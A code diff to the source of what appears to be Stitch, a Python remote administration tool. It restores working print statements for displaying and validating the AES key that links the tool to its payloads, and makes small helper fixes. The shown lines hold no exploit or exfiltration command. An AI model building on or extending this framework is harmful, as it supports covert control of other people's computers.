@@ -110,7 +110,6 @@ def start_command(command):
                 args = shlex.split(command, posix=False)
                 cmd_list = ['cmd', '/c'] + args if args else ['cmd', '/c']
             else:
-                pass
                 # Drop background token if present
                 args = [tok for tok in shlex.split(command) if tok != '&']
                 cmd_list = args
@@ -158,18 +157,18 @@ def decrypt(enc, aes_key=secret):
     return cipher.decrypt( enc[16:] )
 
 def show_aes():
-    pass
-    # st_print('=== Stitch AES Key ===')
-    # st_print('   {}'.format(aes_encoded))
-    # st_print('[*] Copy and add this key to another system running Stitch to '
-    #          'enable communication from payloads created on this system.\n')
+    """Display the current AES key for payload communication"""
+    print('=== Stitch AES Key ===')
+    print(f'   {aes_encoded}')
+    print('[*] Copy and add this key to another system running Stitch to '
+          'enable communication from payloads created on this system.\n')
 
 def add_aes(key):
     aes_lib = ConfigParser.ConfigParser()
     aes_lib.read(st_aes_lib)
     if len(key) != 44:
-        pass
-    # st_print('[!] Invalid AES key. Keys must be 32 bytes after decryption.\n')
+        print('[!] Invalid AES key. Keys must be 32 bytes after decryption.\n')
+        return False
     else:
         try:
             decr_key = base64.b64decode(key)
@@ -178,8 +177,8 @@ def add_aes(key):
     # st_print(err)
         else:
             if len(decr_key) != 32:
-                pass
-    # st_print('[!] Invalid AES key. Keys must be 32 bytes after decryption.\n')
+                print('[!] Invalid AES key. Keys must be 32 bytes after decryption.\n')
+                return False
             else:
                 aes_abbrev = '{}{}{}{}{}{}{}{}{}{}{}{}{}'.format(
                     key[21],key[0],key[1],key[43],key[5],key[13],key[7],key[24],key[31],
@@ -294,8 +293,7 @@ def check_int(val):
         is_int = int(val)
         return True
     except ValueError:
-        pass
-    # print("{} is not a valid number.").format(val)
+        # print("{} is not a valid number.").format(val)
         return False
 
 def append_slash_if_dir(p):
@@ -414,8 +412,8 @@ class progress_bar():
         sys.stdout.flush()
 
 def print_border(length,border):
-    pass
-    # print(border * length)
+    """Print a border of specified length using border character"""
+    print(border * length)
 
 def st_logger(resp,log_path,log_name,verbose=True):
     if no_error(resp):
